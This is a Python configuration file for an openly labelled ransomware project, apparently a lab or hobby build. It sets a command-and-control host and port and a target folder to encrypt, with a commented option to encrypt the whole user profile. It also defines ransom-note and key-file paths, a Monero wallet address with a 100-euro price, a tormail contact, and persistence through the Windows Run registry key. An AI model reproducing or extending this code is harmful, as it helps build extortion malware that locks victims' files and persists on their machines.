# This file contain all constant for ransomware
from os.path import expanduser,dirname,realpath,isdir
import os
import sys

# Server info
HOST = '192.168.159.18'
PORT = 5656

# Where the ransomware should Encrypt
# DIR_TO_HIT = expanduser('~') # If you want encrypt whole user folder (exemple : C:\Users\Bob\)
DIR_TO_HIT = expanduser('~\\Desktop\\DIR_TO_HIT')

# Name of the file.exe
EXE_NAME = "main"

# Ransomware
PATH_RANCON = expanduser('~\\AppData\\Local\\test_28') # Path where are stored every ransomware files
RANSOW_FILE = sys.argv[0] # Path of the ransomware .exe

USER_PATH = expanduser('~')
README_FILE = expanduser('~\\Desktop\\README.txt')


# Inside ransomware folder
PATH_FREE_FILE_DECRYPT = f'{PATH_RANCON}\\path_free_file_decrypt.txt'
ID_KEY_PATH = f'{PATH_RANCON}\\id_key.txt'
FREE_KEY_PATH = f'{PATH_RANCON}\\free_key.txt'
ALREADY_PATH = f'{PATH_RANCON}\\already.txt'
TODAY_PATH = f'{PATH_RANCON}\\tday.txt'
PRICE_MONERO_PATH = f'{PATH_RANCON}\\monero_price.txt'

# For Gui
EMAIL = 'example@tormail.com'
MONERO_ADDRESS = '8AjPMwYakhxVfStZzKW34JNJD8Jnr3vBQ4CnTzcfRymNXJHUuZ4nRitT2nShynZzzpNXjRKofinL9BLYsQme1yiTDWyKT6r'
DESKTOP_PATH = expanduser('~\\Desktop')
# Monero Price 
PRICE_MONERO_EUR = 100

# Regedit
KEY_REGEDIT = 'HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' # Path of regedit
RANSOW_FILE_REGEDIT = f'{PATH_RANCON}\\{EXE_NAME}.exe' # Path of the .exe into regedit

# For executable
FILE_PATH_PY = __file__ 
DIR_RANCON = dirname(realpath(__file__)) # AppData\Local\_MEIPASS

#All images
JOKER_IMG_PATH = f'{DIR_RANCON}\\GUI\\images\\joker.png'
MONERO_IMG_PATH = f'{DIR_RANCON}\\GUI\\images\\monero.png'
KEY_IMG_PATH = f'{DIR_RANCON}\\GUI\\images\\key.png'
BUFFOON_ICO_PATH = f'{DIR_RANCON}\\GUI\\images\\bouffon.ico'